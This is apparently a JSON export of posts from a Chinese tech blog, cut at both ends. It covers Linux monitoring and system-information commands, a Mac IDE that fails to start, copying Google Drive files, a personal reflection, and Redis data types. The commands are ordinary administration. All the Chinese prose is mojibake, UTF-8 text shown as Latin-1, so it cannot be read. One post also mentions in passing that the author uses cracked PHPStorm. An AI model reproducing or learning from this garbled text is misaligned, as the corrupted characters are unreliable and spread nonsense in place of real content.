ä¸€ç§’ä¸­æœ‰ç™¾åˆ†ä¹‹å¤šå°‘çš„æ—¶é—´ç”¨äº I/O æ“ä½œ,æˆ–è€…è¯´ä¸€ç§’ä¸­æœ‰å¤šå°‘æ—¶é—´ I/O é˜Ÿåˆ—æ˜¯éç©ºçš„ã€‚ iotopiotopå‘½ä»¤ æ˜¯ä¸€ä¸ªç”¨æ¥ç›‘è§†ç£ç›˜I/Oä½¿ç”¨çŠ¶å†µçš„topç±»å·¥å…·ã€‚ iotopå…·æœ‰ä¸topç›¸ä¼¼çš„UIï¼Œå…¶ä¸­åŒ…æ‹¬PIDã€ç”¨æˆ·ã€I/Oã€è¿›ç¨‹ç­‰ç›¸å…³ä¿¡æ¯ã€‚Linuxä¸‹çš„IOç»Ÿè®¡å·¥å…·å¦‚iostatï¼Œnmonç­‰å¤§å¤šæ•°æ˜¯åªèƒ½ç»Ÿè®¡åˆ°perè®¾å¤‡çš„è¯»å†™æƒ…å†µï¼Œå¦‚æœä½ æƒ³çŸ¥é“æ¯ä¸ªè¿›ç¨‹æ˜¯å¦‚ä½•ä½¿ç”¨IOçš„å°±æ¯”è¾ƒéº»çƒ¦ï¼Œä½¿ç”¨iotopå‘½ä»¤å¯ä»¥å¾ˆæ–¹ä¾¿çš„æŸ¥çœ‹ã€‚ è¯­æ³•ï¼š 1iotop (é€‰é¡¹) é€‰é¡¹ï¼š-oï¼šåªæ˜¾ç¤ºæœ‰ioæ“ä½œçš„è¿›ç¨‹-bï¼šæ‰¹é‡æ˜¾ç¤ºï¼Œæ— äº¤äº’ï¼Œä¸»è¦ç”¨ä½œè®°å½•åˆ°æ–‡ä»¶ã€‚-nï¼š NUMï¼šæ˜¾ç¤ºNUMæ¬¡ï¼Œä¸»è¦ç”¨äºéäº¤äº’å¼æ¨¡å¼ã€‚-d SECï¼šé—´éš”SECç§’æ˜¾ç¤ºä¸€æ¬¡ã€‚-p PIDï¼šç›‘æ§çš„è¿›ç¨‹pidã€‚-u USERï¼šç›‘æ§çš„è¿›ç¨‹ç”¨æˆ·ã€‚ iotopå¸¸ç”¨å¿«æ·é”®ï¼š å·¦å³ç®­å¤´ï¼šæ”¹å˜æ’åºæ–¹å¼ï¼Œé»˜è®¤æ˜¯æŒ‰IOæ’åºã€‚ rï¼šæ”¹å˜æ’åºé¡ºåºã€‚ oï¼šåªæ˜¾ç¤ºæœ‰IOè¾“å‡ºçš„è¿›ç¨‹ã€‚ pï¼šè¿›ç¨‹/çº¿ç¨‹çš„æ˜¾ç¤ºæ–¹å¼çš„åˆ‡æ¢ã€‚ aï¼šæ˜¾ç¤ºç´¯ç§¯ä½¿ç”¨é‡ã€‚ qï¼šé€€å‡ºã€‚ è¿›ç¨‹pspsï¼ˆProcess Statusï¼Œè¿›ç¨‹çŠ¶æ€ï¼‰å‘½ä»¤ ç”¨äºæŠ¥å‘Šå½“å‰ç³»ç»Ÿçš„è¿›ç¨‹çŠ¶æ€ã€‚ ps çš„ç”¨æ³•éå¸¸å¤šï¼Œè¿™é‡Œä»…åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„ï¼š 123456ps -aux | grep &lt;name&gt; # æŸ¥çœ‹name è¿›ç¨‹è¯¦ç»†ä¿¡æ¯ps -p &lt;pid&gt; -L # æ˜¾ç¤ºè¿›ç¨‹&lt;pid&gt; çš„æ‰€æœ‰çº¿ç¨‹ps -o lstart &lt;pid&gt; # æ˜¾ç¤ºè¿›ç¨‹çš„å¯åŠ¨æ—¶é—´ps -f --forest -C &lt;name&gt; # ç”¨æ ‘çš„é£æ ¼æ˜¾ç¤ºè¿›ç¨‹çš„å±‚æ¬¡å…³ç³»ps -e -o pid,uname,pcpu,pmem,comm,etime # å®šåˆ¶æ˜¾ç¤ºçš„åˆ—ps -o lstart &lt;pid&gt; # æ˜¾ç¤ºè¿›ç¨‹çš„å¯åŠ¨æ—¶é—´ ç³»ç»Ÿç›‘æ§å…¨èƒ½å·¥å…·glancesglances æ˜¯ä¸€ä¸ªç”¨æ¥ç›‘è§† GNU/Linux å’Œ FreeBSD æ“ä½œç³»ç»Ÿçš„ GPL æˆæƒçš„å…¨èƒ½å·¥å…·ã€‚ Glances ä¼šç”¨ä¸€ä¸‹å‡ ç§é¢œè‰²æ¥ä»£è¡¨çŠ¶æ€ï¼š ç»¿è‰²ï¼šOKï¼ˆä¸€åˆ‡æ­£å¸¸ï¼‰ è“è‰²ï¼šCAREFULï¼ˆéœ€è¦æ³¨æ„ï¼‰ ç´«è‰²ï¼šWARNINGï¼ˆè­¦å‘Šï¼‰ çº¢è‰²ï¼šCRITICALï¼ˆä¸¥é‡ï¼‰ã€‚ é˜€å€¼å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ï¼Œä¸€èˆ¬é˜€å€¼è¢«é»˜è®¤è®¾ç½®ä¸ºï¼ˆcareful=50ã€warning=70ã€critical=90ï¼‰ã€‚ dstatdstatå‘½ä»¤ æ˜¯ä¸€ä¸ªç”¨æ¥æ›¿æ¢vmstatã€iostatã€netstatã€nfsstatå’Œifstatè¿™äº›å‘½ä»¤çš„å·¥å…·ã€‚ ç›´æ¥ä½¿ç”¨dstatï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯-cdngyå‚æ•°ï¼Œåˆ†åˆ«æ˜¾ç¤ºcpuã€diskã€netã€pageã€systemä¿¡æ¯ï¼Œé»˜è®¤æ˜¯1sæ˜¾ç¤ºä¸€æ¡ä¿¡æ¯ã€‚ å‚è€ƒé“¾æ¥ Linuxç³»ç»Ÿç›‘æ§å‘½ä»¤æ•´ç†æ±‡æ€»-æŒæ¡CPU,å†…å­˜,ç£ç›˜IOç­‰æ‰¾å‡ºæ€§èƒ½ç“¶é¢ˆ","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"}]},{"title":"Mac ä¸‹IDEA æ— æ³•æ­£å¸¸å¯åŠ¨","slug":"idea-cannot-start-normally-under-mac","date":"2020-11-15T15:37:34.000Z","updated":"2020-11-18T08:42:47.601Z","comments":true,"path":"idea-cannot-start-normally-under-mac/","link":"","permalink":"https://www.0x2beace.com/idea-cannot-start-normally-under-mac/","excerpt":"å‰è¨€ä»Šå¤©æœ¬æ¥æ‰“ç®—ä½¿ç”¨PHPStormçš„ï¼Œä½†æ˜¯çªç„¶å¯åŠ¨ä¸äº†äº†ï¼Œå°±æ˜¯åŒå‡»åº”ç”¨ç¨‹åºä¹‹åï¼Œç”µè„‘æ²¡æœ‰ä»»ä½•ååº”ã€‚","text":"å‰è¨€ä»Šå¤©æœ¬æ¥æ‰“ç®—ä½¿ç”¨PHPStormçš„ï¼Œä½†æ˜¯çªç„¶å¯åŠ¨ä¸äº†äº†ï¼Œå°±æ˜¯åŒå‡»åº”ç”¨ç¨‹åºä¹‹åï¼Œç”µè„‘æ²¡æœ‰ä»»ä½•ååº”ã€‚ å› ä¸ºä½¿ç”¨çš„PHPStormæ˜¯ç ´è§£çš„ï¼Œæ‰€ä»¥æˆ‘ä»¥ä¸ºæ˜¯å¤±æ•ˆäº†ã€‚å°±åœ¨æˆ‘ä¸€ç­¹è«å±•å‡†å¤‡é‡è£…ä¸€éçš„ï¼Œçªç„¶æƒ³èµ·â€è¦ä¸è¯•è¯•é€šè¿‡å‘½ä»¤è¡Œå¯åŠ¨â€œï¼Ÿ äºæ˜¯æˆ‘æ‰¾åˆ°PHPStromçš„åŒ…æ–‡ä»¶ä¹‹åï¼Œå°è¯•é€šè¿‡å‘½ä»¤è¡Œå¯åŠ¨ï¼Œè™½ç„¶åŒæ ·å¤±è´¥äº†ï¼Œä½†æ˜¯å‘½ä»¤è¡Œè¾“å‡ºäº†ä¸€äº›ä¿¡æ¯ã€‚ æ­£æ˜¯è¿™äº›ä¿¡æ¯ï¼Œæ‰è®©æˆ‘æƒ³èµ·æ¥ï¼Œä»Šå¤©ä¸Šåˆåœ¨æ•´ç†æ–‡ä»¶æ—¶ï¼Œä¸å°å¿ƒæŠŠPHPStormä¸­ä¾èµ–çš„ä¸€ä¸ªæ–‡ä»¶ç»™åˆ é™¤æ‰äº†ã€‚ äºæ˜¯ï¼Œé©¬ä¸Šæ‰¾åˆ°äº†é‚£ä¸ªæ–‡ä»¶å¹¶è¿˜åŸäº†ï¼Œä¹‹åæœç„¶èƒ½æ­£å¸¸å¯åŠ¨äº†ã€‚ è§£å†³åŠæ³•å¦‚æœä½ ä¹Ÿé‡åˆ°äº†ç±»ä¼¼çš„æƒ…å†µï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•è¿™ç§æ–¹å¼ï¼Œæˆ–è®¸èƒ½å¸®åŠ©ä½ æ‰¾åˆ°é—®é¢˜æ‰€åœ¨ã€‚ æ‰¾åˆ°åº”ç”¨ç¨‹åº å³é”®æ˜¾ç¤ºåŒ…æ–‡ä»¶ ä¾æ¬¡è¿›å…¥Contents-&gt;MacOS åŒå‡»shellè„šæœ¬ æ¥ç€æ— è®ºæˆåŠŸæˆ–å¤±è´¥éƒ½èƒ½è¾“å‡ºä¸€äº›å†…å®¹ï¼Œç„¶ååˆ©ç”¨è¿™äº›å†…å®¹å»æŸ¥æ‰¾é—®é¢˜æ‰€åœ¨ã€‚","categories":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Google Drive å¦‚ä½•è½¬å­˜æ–‡ä»¶ï¼Ÿ","slug":"how-does-google-drive-transfer-files","date":"2020-11-13T13:55:50.000Z","updated":"2020-11-13T13:57:07.503Z","comments":true,"path":"how-does-google-drive-transfer-files/","link":"","permalink":"https://www.0x2beace.com/how-does-google-drive-transfer-files/","excerpt":"å¯¹äºåˆæ¬¡ä½¿ç”¨Google Driveï¼ˆä»¥ä¸‹ç®€ç§° GDï¼‰çš„åŒå­¦æ¥è¯´ï¼Œå¯èƒ½ä¼šæœ‰ä»¥ä¸‹å‡ ç‚¹å›°æƒ‘ã€‚","text":"å¯¹äºåˆæ¬¡ä½¿ç”¨Google Driveï¼ˆä»¥ä¸‹ç®€ç§° GDï¼‰çš„åŒå­¦æ¥è¯´ï¼Œå¯èƒ½ä¼šæœ‰ä»¥ä¸‹å‡ ç‚¹å›°æƒ‘ã€‚ å¤§å®¶å¸¸è¯´çš„è½¬å­˜æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ å¸¸è§çš„è½¬å­˜æ–¹å¼æœ‰å“ªå‡ ç§ï¼Ÿ åœ¨æ­£å¼å›ç­”ä¸Šé¢ä¸¤ä¸ªé—®é¢˜ä¹‹å‰ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹GDã€‚ GD æ˜¯Google åœ¨2012 å¹´4 æœˆ24 æ—¥æ¨å‡ºçš„ä¸€ä¸ªåœ¨çº¿åŒæ­¥å­˜å‚¨æœåŠ¡ï¼Œç±»ä¼¼ç™¾åº¦çš„ç™¾åº¦ç½‘ç›˜ï¼Œä¸è¿‡ä¸åŒä¹‹å¤„åœ¨äºGD ä¸ä¼šé™é€Ÿã€‚æ™®é€šç”¨æˆ·é»˜è®¤çš„å­˜å‚¨ç©ºé—´æ˜¯15 GBã€‚ ç”¨æˆ·å¯ä»¥å°†å…¶ä»–ç”¨æˆ·åˆ†äº«çš„æ–‡ä»¶æ·»åŠ åˆ°â€œæˆ‘çš„äº‘ç«¯ç¡¬ç›˜â€ï¼Œè¿™ç§æ–¹å¼å¹¶ä¸ä¼šå ç”¨ç”¨æˆ·çš„å­˜å‚¨ç©ºé—´ï¼Œè¿™ä¸ªæ“ä½œç›¸å½“äºæ˜¯åœ¨â€œæˆ‘çš„äº‘ç«¯ç¡¬ç›˜â€ä¸­åˆ›å»ºäº†ä¸€ä¸ªè½¯é“¾æ¥ï¼Œå¯ä»¥å¿«é€Ÿè®¿é—®è¯¥æ–‡ä»¶ï¼Œè€Œæ–‡ä»¶æ‰€æœ‰è€…åˆ™è¿˜æ˜¯åˆ†äº«è€…ï¼Œå¦‚æœåŸä½œè€…åˆ é™¤äº†ï¼Œé‚£ä¹ˆä½ ç½‘ç›˜é‡Œçš„ä¹Ÿä¼šæ¶ˆå¤±ã€‚ æ‰€ä»¥ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œè½¬å­˜çš„æ¦‚å¿µä¾¿è¯ç”Ÿäº†ï¼Œå®ƒå­˜åœ¨çš„æ„ä¹‰æ˜¯å°†å…¶ä»–ç”¨æˆ·åˆ†äº«çš„æ–‡ä»¶ä¿å­˜è‡³è‡ªå·±çš„äº‘ç›˜ï¼Œç±»ä¼¼ç™¾åº¦ç½‘ç›˜çš„â€œä¿å­˜åˆ°æˆ‘çš„ç½‘ç›˜â€åŠŸèƒ½ã€‚ ä½†æœ‰æ‰€ä¸åŒçš„æ˜¯ï¼Œå¦‚æœåˆ†äº«è€…æ²¡æœ‰å¼€æ”¾æƒé™ï¼Œé‚£ä¹ˆå…¶ä»–ç”¨æˆ·åˆ™æ— æƒè½¬å­˜ã€‚ æ–¹å¼ä¸€åœ¨éœ€è¦è½¬å­˜çš„æ–‡ä»¶ä¸Šï¼Œç‚¹å‡»å³é”®ï¼Œåˆ¶ä½œä¸€ä¸ªæ‹·è´ï¼Œæ‹·è´çš„æ–‡ä»¶ä½äºâ€œæˆ‘çš„äº‘ç«¯ç¡¬ç›˜â€ä¸­ã€‚ ç¬¬ä¸€ç§æ–¹å¼æœ€ç®€å•ï¼Œé€‚ç”¨äºå°æ–‡ä»¶ï¼Œä¸èƒ½å¯¹æ–‡ä»¶å¤¹è¿›è¡Œ Copy æ“ä½œã€‚ æ–¹å¼äºŒCopy, URL to Google Drive æ˜¯ä¸€ä¸ªäº‘ç«¯ç¡¬ç›˜æ’ä»¶ã€‚ åœ¨ç›®æ ‡æ–‡ä»¶ä¸Šç‚¹å‡»å³é”®ï¼Œé€‰æ‹©æ‰“å¼€æ–¹å¼ï¼Œå…³è”æ›´å¤šåº”ç”¨ã€‚ æœç´¢Copy, URL to Google Drive è¿›è¡Œå®‰è£…ã€‚ å®‰è£…å®Œæˆä¹‹åï¼Œè¿˜éœ€è¦è¿›è¡ŒGoogle è´¦å·æˆæƒæ‰èƒ½è¿›è¡Œè½¬å­˜æ“ä½œã€‚ åœ¨éœ€è¦è½¬å­˜çš„æ–‡ä»¶å¤¹ä¸Š å³é”®-æ‰“å¼€æ–¹å¼-Copy, URL to Google Driveï¼Œä¹‹åç‚¹å‡» Save, Copy to Google Driveï¼Œå°±å¯ä»¥çœ‹è§æ­£åœ¨è½¬å­˜äº†ï¼Œå¦‚æœæ–‡ä»¶è¾ƒå¤§æ—¶é—´ä¼šæ¯”è¾ƒä¹…ã€‚ æ–¹å¼ä¸‰åœ¨Telegram ä¸Šæœ‰äººå¼€å‘äº†ä¸€ä¸ªæœºå™¨äººï¼ˆ@GoogleDriveManagerBotï¼‰ï¼Œä¸“é—¨ç”¨äºGD æ–‡ä»¶è½¬å­˜ã€‚ è¯¥æœºå™¨äººå¯ä»¥å®ç°è°·æ­Œç½‘ç›˜èµ„æºè½¬å­˜ä»¥åŠç½‘ç›˜å†…èµ„æºæ‰¹é‡é‡å‘½åï¼Œæ™®é€šç”¨æˆ·ä»…å¯ç»‘å®šä¸€ä¸ª GD è´¦å·ã€‚é€šè¿‡ç®€å•çš„å‘½ä»¤å³å¯å¯¹æ–‡ä»¶è¿›è¡Œè½¬å­˜ã€‚ æ€»ç»“æ–¹å¼ä¸€æœ€ç®€å•ï¼Œé—¨æ§›æœ€ä½ï¼Œå³ä½¿åœ¨æ²¡æœ‰æƒé™çš„æƒ…å†µä¸‹ï¼Œä¹Ÿèƒ½è¿›è¡ŒCopy æ“ä½œï¼Œä½†æ˜¯æ•ˆç‡å¾ˆä½ã€‚ æ–¹å¼äºŒã€ä¸‰çœäº‹ï¼Œæ•ˆç‡é«˜ï¼Œä½†å‰ææ˜¯å¾—æœ‰æƒé™ã€‚ å‚è€ƒé“¾æ¥ ä¸€ä¸ªæ–¹ä¾¿è½¬å­˜ Google Drive åˆ†äº«æ–‡ä»¶çš„æ–¹æ³• è½¬å­˜Google Driveèµ„æºåˆ°è‡ªå·±çš„Google Drive Linux ä¸‹ä½¿ç”¨ rclone æŒ‚è½½ç½‘ç›˜åˆ°æœ¬åœ°","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Google Drive","slug":"Google-Drive","permalink":"https://www.0x2beace.com/tags/Google-Drive/"}]},{"title":"äº’è”ç½‘äººçš„åŒåä¸€","slug":"double-eleven-for-internet-people","date":"2020-11-12T00:33:10.000Z","updated":"2020-11-12T00:34:35.354Z","comments":true,"path":"double-eleven-for-internet-people/","link":"","permalink":"https://www.0x2beace.com/double-eleven-for-internet-people/","excerpt":"æˆ‘å…¶å®ä¸å¤ªä¼šå»å†™è¿™ç±»æ–‡ç« ï¼Œé‚£ä¸ºä»€ä¹ˆè¦å†™è¿™ç¯‡æ–‡ç« å‘¢ï¼Ÿæƒ³æŠ“ä½åŒåä¸€çš„å°¾å·´ï¼Œè®°å½•ä¸€äº›æƒ³æ³•ã€‚","text":"æˆ‘å…¶å®ä¸å¤ªä¼šå»å†™è¿™ç±»æ–‡ç« ï¼Œé‚£ä¸ºä»€ä¹ˆè¦å†™è¿™ç¯‡æ–‡ç« å‘¢ï¼Ÿæƒ³æŠ“ä½åŒåä¸€çš„å°¾å·´ï¼Œè®°å½•ä¸€äº›æƒ³æ³•ã€‚ ä»Šå¹´çš„åŒåä¸€æˆ‘æœ¬æ¥ä¹Ÿæ˜¯å•¥éƒ½æ²¡ä¹°ï¼Œ å¯å°±åœ¨æ™šä¸Šä¸ƒç‚¹å·¦å³ï¼Œçº¿ä¸Šçš„æŸä¸ªå¹³å°ï¼Œå‡ºäº†ä¸€ç‚¹é—®é¢˜ï¼Œè®¢å•çš„ç›ˆäºè·Ÿç”¨æˆ·çš„ä½™é¢å¯¹ä¸ä¸Šã€‚ç»è¿‡ä¸€ç•ªæ’æŸ¥å‘ç°æ˜¯å› ä¸ºå¤„ç†è®¢å•çš„é‚£ä¸ªè„šæœ¬ä¸çŸ¥ä¸ºä½•ç‰¹åˆ«æ…¢ï¼Œå¯¼è‡´å¤§é‡è®¢å•å…¨éƒ¨å †ç§¯åœ¨ä¸€èµ·äº†ã€‚ å› ä¸ºä¸€äº›å†å²åŒ…è¢±çš„åŸå› ï¼Œåœ¨å¤„ç†æ–¹å¼ä¸Šæˆ‘æ˜¯çŸ¥é“è¿™ä¸ªè„šæœ¬å­˜åœ¨ä¸€äº›éšæ‚£çš„ã€‚åŒäº‹æè®®ä¸å¦‚è¿™ä¸ªè„šæœ¬è®©ä»–å»ç”¨Node.js å†™å§ï¼Œå°½ç®¡å¾ˆä¸æƒ…æ„¿ï¼Œä½†ä¹Ÿæ²¡åŠæ³•ã€‚ æƒ³åœ¨ä»”ç»†å›æƒ³ï¼Œå½“æ—¶é‚£ç§æ„Ÿè§‰è¿˜æ˜¯å¾ˆæ¸…æ™°ï¼Œæˆ‘çœŸçš„ä¸å–œæ¬¢é‚£ç§èƒ½è¢«æ›¿ä»£çš„æ„Ÿè§‰ï¼Œé‚£ä¸€ç¬é—´è§‰å¾—æ‰€æœ‰çš„å¨±ä¹æ´»åŠ¨éƒ½æ²¡æœ‰æ„æ€äº†ï¼Œåªæœ‰æŠŠæŠ€æœ¯æ‰æ˜¯å”¯ä¸€çš„çƒ­çˆ±ã€‚ æ™šä¸Šå›å®¶ä¹‹åï¼Œç¬¬ä¸€ä»¶äº‹åº”è¯¥æ˜¯ç»ƒå‰ä»–ï¼Œä½†æ˜¨å¤©ä¼¼ä¹ä¹Ÿæ²¡å•¥å¿ƒæ€ç»ƒäº†ã€‚ ä»Šå¹´æœ¬æ¥å°±æ²¡å°‘ä¸ºçŸ¥è¯†ä»˜è´¹ï¼Œè§†é¢‘è¯¾ç¨‹ï¼Œç”µå­ä¹¦ç±ï¼Œçº¸è´¨ä¹¦ç±å„ç§å­¦ä¹ èµ„æ–™ã€‚ ç„¶åæ˜¨å¤©æ™šä¸Šåˆåœ¨æ…•è¯¾ç½‘ä¸Šä¹°äº†ä¸‰é—¨å®æˆ˜è¯¾ç¨‹ï¼ŒçœŸçš„ä¸æƒ³åšä¸€ä¸ªCruderï¼Œè¿™æ˜¯æˆ‘æœ€åçš„å€”å¼ºäº†ã€‚ åœ¨å¦‚ä»Šè¿™ä¸ªäº’è”ç½‘é«˜é€Ÿå‘å±•çš„æ—¶ä»£ï¼Œæˆ‘æƒ³å­¦ä¹ ä»¥åŠéœ€è¦å­¦ä¹ çš„ä¸œè¥¿çœŸçš„æ˜¯å¤ªå¤šäº†ï¼ŒçœŸçš„æ˜¯å­¦çš„è¶Šå¤šï¼Œæ‰å‘ç°è‡ªå·±æ‡‚çš„çœŸçš„å¥½å°‘ã€‚ æœ€åæƒ³è¯´çš„æ˜¯ï¼Œå¸Œæœ›è‡ªå·±èƒ½ä¿æŒä½è¿™ä»½åˆå¿ƒï¼Œç»§ç»­åŠ æ²¹ã€‚","categories":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"ç¢ç¢å¿µ","slug":"ç¢ç¢å¿µ","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"Linux æŸ¥çœ‹ç³»ç»Ÿã€ç¡¬ä»¶ä¿¡æ¯","slug":"linux-view-system-and-hardware-information","date":"2020-11-09T14:33:03.000Z","updated":"2020-11-09T14:36:19.179Z","comments":true,"path":"linux-view-system-and-hardware-information/","link":"","permalink":"https://www.0x2beace.com/linux-view-system-and-hardware-information/","excerpt":"ä»¥ä¸‹å‘½ä»¤éƒ½æ˜¯åŸºäºUbuntuã€‚","text":"ä»¥ä¸‹å‘½ä»¤éƒ½æ˜¯åŸºäºUbuntuã€‚ ç³»ç»Ÿç›¸å…³æŸ¥çœ‹å†…æ ¸/æ“ä½œç³»ç»Ÿ/CPUä¿¡æ¯1$ uname -a æŸ¥çœ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬1$ head -n 1 &#x2F;etc&#x2F;issue æŸ¥çœ‹æœºå™¨å‹å·1$ dmidecode | grep &quot;Product Name&quot; æŸ¥çœ‹ä¸»æœºå1$ hostname åˆ—å‡ºæ‰€æœ‰PCIè®¾å¤‡1$ lspci -tv åˆ—å‡ºæ‰€æœ‰USBè®¾å¤‡1$ lsusb -tv åˆ—å‡ºåŠ è½½çš„å†…æ ¸æ¨¡å—1$ lsmod æŸ¥çœ‹ç¯å¢ƒå˜é‡1$ env èµ„æºæŸ¥çœ‹å†…å­˜ä½¿ç”¨é‡å’Œäº¤æ¢åŒºä½¿ç”¨é‡1$ free -m æŸ¥çœ‹å„åˆ†åŒºä½¿ç”¨æƒ…å†µ1$ df -h æŸ¥çœ‹æ€»å†…å­˜é‡1$ grep MemTotal &#x2F;proc&#x2F;meminfo æŸ¥çœ‹ç©ºé—²å†…å­˜é‡1$ grep MemFree &#x2F;proc&#x2F;meminfo æŸ¥çœ‹ç³»ç»Ÿè¿è¡Œæ—¶é—´ã€ç”¨æˆ·æ•°ã€è´Ÿè½½1$ uptime æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½1$ cat &#x2F;proc&#x2F;loadavg CPUæŸ¥çœ‹CPU ç»Ÿè®¡ä¿¡æ¯1$ lscpu æŸ¥çœ‹å•ä¸ªCPU ä¿¡æ¯1cat &#x2F;proc&#x2F;cpuinfo ç£ç›˜å’Œåˆ†åŒºæŸ¥çœ‹ç£ç›˜ç©ºé—´ä¿¡æ¯1$ df -h æŸ¥çœ‹æŒ‚æ¥çš„åˆ†åŒºçŠ¶æ€1mount | column -t æŸ¥çœ‹æ‰€æœ‰åˆ†åŒº1$ fdisk -l æŸ¥çœ‹æ‰€æœ‰äº¤æ¢åˆ†åŒº1$ swapon -s ç½‘ç»œæŸ¥çœ‹æ‰€æœ‰ç½‘ç»œæ¥å£çš„å±æ€§1$ ifconfig æŸ¥çœ‹é˜²ç«å¢™è®¾ç½®1$ iptables -L æŸ¥çœ‹è·¯ç”±è¡¨1$ route -n æŸ¥çœ‹æ‰€æœ‰ç›‘å¬ç«¯å£1$ netstat -lntp æŸ¥çœ‹æ‰€æœ‰å·²ç»å»ºç«‹çš„è¿æ¥1$ netstat -antp æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡ä¿¡æ¯1$ netstat -s è¿›ç¨‹æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹1$ ps -ef å®æ—¶æ˜¾ç¤ºè¿›ç¨‹çŠ¶æ€1$ top ç”¨æˆ·æŸ¥çœ‹æ´»åŠ¨ç”¨æˆ·1$ w æŸ¥çœ‹æŒ‡å®šç”¨æˆ·ä¿¡æ¯1$ id &lt;ç”¨æˆ·å&gt; æŸ¥çœ‹ç”¨æˆ·ç™»å½•æ—¥å¿—1$ last æŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰ç”¨æˆ·1$ cut -d: -f1 &#x2F;etc&#x2F;passwd æŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰ç»„1$ cut -d: -f1 &#x2F;etc&#x2F;group æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡1$ crontab -l æœåŠ¡åˆ—å‡ºæ‰€æœ‰ç³»ç»ŸæœåŠ¡1$ chkconfig --list åˆ—å‡ºæ‰€æœ‰å¯åŠ¨çš„ç³»ç»ŸæœåŠ¡1$ chkconfig --list | grep on å‚è€ƒé“¾æ¥ Linux æŸ¥çœ‹CPUä¿¡æ¯ï¼Œæœºå™¨å‹å·ï¼Œå†…å­˜ç­‰ä¿¡æ¯","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Redis å¸¸ç”¨æ•°æ®ç±»å‹æ•´ç†","slug":"redis-common-data-types-sorting","date":"2020-11-07T14:43:21.000Z","updated":"2023-02-18T03:28:33.605Z","comments":true,"path":"redis-common-data-types-sorting/","link":"","permalink":"https://www.0x2beace.com/redis-common-data-types-sorting/","excerpt":"Redis çš„äº”ç§æ•°æ®ç±»å‹åˆ†åˆ«æ˜¯ï¼šå­—ç¬¦ä¸²ã€å“ˆå¸Œã€åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆã€‚","text":"Redis çš„äº”ç§æ•°æ®ç±»å‹åˆ†åˆ«æ˜¯ï¼šå­—ç¬¦ä¸²ã€å“ˆå¸Œã€åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆã€‚ stringString æ˜¯Redis æœ€åŸºæœ¬çš„æ•°æ®ç±»å‹ï¼Œä¸€ä¸ª Key å¯¹åº”ä¸€ä¸ª Valueã€‚ String ç±»å‹æ˜¯äºŒè¿›åˆ¶å®‰å…¨çš„ã€‚æ„æ€æ˜¯ Redis çš„ String å¯ä»¥åŒ…å«ä»»ä½•æ•°æ®ã€‚ï¼ˆæ•°å­—ï¼šæ•´æµ®å‹ç‚¹æ•°ï¼ŒäºŒè¿›åˆ¶ï¼šå›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ã€åºåˆ—åŒ–çš„å¯¹è±¡ï¼‰ String ç±»å‹æ˜¯ Redis æœ€åŸºæœ¬çš„æ•°æ®ç±»å‹ï¼Œä¸€ä¸ªé”®æœ€å¤§èƒ½å­˜å‚¨ 512 MBã€‚ åº”ç”¨åœºæ™¯ incrï¼šè®¡æ•° set + getï¼šå°†å¯¹è±¡/Json åºåˆ—åŒ–ä¹‹åå­˜å‚¨ä½œä¸ºCache å¿«é€Ÿä¸Šæ‰‹ hashRedis hash æ˜¯ä¸€ä¸ªé”®å€¼å¯¹é›†åˆã€‚ Redis hash æ˜¯ä¸€ä¸ª String ç±»å‹çš„ field å’Œ value çš„æ˜ å°„è¡¨ï¼Œhash ç‰¹åˆ«é€‚åˆç”¨äºå­˜å‚¨å¯¹è±¡ã€‚ åº”ç”¨åœºæ™¯ hset + hgetï¼šCache å¿«é€Ÿä¸Šæ‰‹åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œâ€œrediscomcnâ€ æ˜¯ Redis å“ˆå¸Œï¼Œå®ƒåŒ…å«è¯¦ç»†ä¿¡æ¯ï¼ˆnameï¼Œurlï¼Œrankï¼Œvisitorsï¼‰å±æ€§ã€‚ listç”¨æ¥å­˜å‚¨å¤šä¸ªæœ‰åºçš„å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªåˆ—è¡¨æœ€å¤šå¯ä»¥å­˜ 2 çš„ 32 æ¬¡æ–¹å‡ 1 ä¸ªå…ƒç´ ã€‚ åˆ—è¡¨çš„ç‰¹ç‚¹æ˜¯ï¼š æœ‰åº å…è®¸é‡å¤ åº”ç”¨åœºæ™¯ lpush + lpopï¼šStack lpush + rpopï¼šQueue lpush + ltrimï¼šCapped Collection lpush + brpopï¼šMessage Queue å¿«é€Ÿä¸Šæ‰‹ 